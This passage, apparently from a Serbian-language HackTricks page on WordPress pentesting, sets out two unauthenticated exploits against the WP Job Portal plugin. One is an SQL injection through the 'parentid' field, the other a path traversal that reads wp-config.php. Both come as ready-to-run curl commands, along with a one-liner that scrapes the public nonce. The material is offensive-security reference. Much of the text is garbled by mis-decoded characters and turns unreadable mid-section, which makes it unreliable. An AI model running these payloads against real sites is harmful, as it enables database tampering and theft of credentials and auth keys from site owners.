3. **Neautentifikovana dostupnost** â€“ iako se akcija izvrÅ¡ava putem `admin-post.php`, jedina provera koja postoji je **CSRF nonce** (`wp_verify_nonce()`), koji svaki posetilac moÅ¾e preuzeti sa javne stranice koja ukljuÄuje shortcode `[wpjobportal_my_resumes]`.

#### Eksploatacija

1. Preuzmite sveÅ¾ nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Injektujte proizvoljni SQL zloupotrebom `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Odgovor otkriva rezultat injektovane upita ili menja bazu podataka, dokazujuÄ‡i SQLi.


### Neautentifikovano preuzimanje proizvoljnih fajlova / Putanja Traversal (WP Job Portal <= 2.3.2)

JoÅ¡ jedan zadatak, **downloadcustomfile**, omoguÄ‡io je posetiocima da preuzmu **bilo koji fajl na disku** putem putanje traversal. Ranjiva taÄka se nalazi u `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` Ñ˜Ğµ Ğ¿Ğ¾Ğ´ ĞºĞ¾Ğ½Ñ‚Ñ€Ğ¾Ğ»Ğ¾Ğ¼ Ğ½Ğ°Ğ¿Ğ°Ğ´Ğ°Ñ‡Ğ° Ğ¸ ĞºĞ¾Ğ½ĞºĞ°Ñ‚ĞµĞ½Ğ¾Ğ²Ğ°Ğ½ Ñ˜Ğµ **Ğ±ĞµĞ· ÑĞ°Ğ½Ğ¸Ñ‚Ğ°Ñ€Ğ½Ğµ Ğ¾Ğ±Ñ€Ğ°Ğ´Ğµ**. ĞĞ¿ĞµÑ‚, Ñ˜ĞµĞ´Ğ¸Ğ½Ğ¸ Ğ·Ğ°ÑˆÑ‚Ğ¸Ñ‚Ğ½Ğ¸ Ğ¼ĞµÑ…Ğ°Ğ½Ğ¸Ğ·Ğ°Ğ¼ Ñ˜Ğµ **CSRF nonce** ĞºĞ¾Ñ˜Ğ¸ ÑĞµ Ğ¼Ğ¾Ğ¶Ğµ Ğ¿Ñ€ĞµÑƒĞ·ĞµÑ‚Ğ¸ ÑĞ° ÑÑ‚Ñ€Ğ°Ğ½Ğ¸Ñ†Ğµ Ğ·Ğ° Ñ€ĞµĞ·Ğ¸Ğ¼Ğµ.

#### Ğ˜ÑĞºĞ¾Ñ€Ğ¸ÑˆÑ›Ğ°Ğ²Ğ°ÑšĞµ
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Server odgovara sadrÅ¾ajem `wp-config.php`, otkrivajuÄ‡i DB akreditive i auth kljuÄeve.

## Reference

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)

{{#include ../../banners/hacktricks-training.md}}
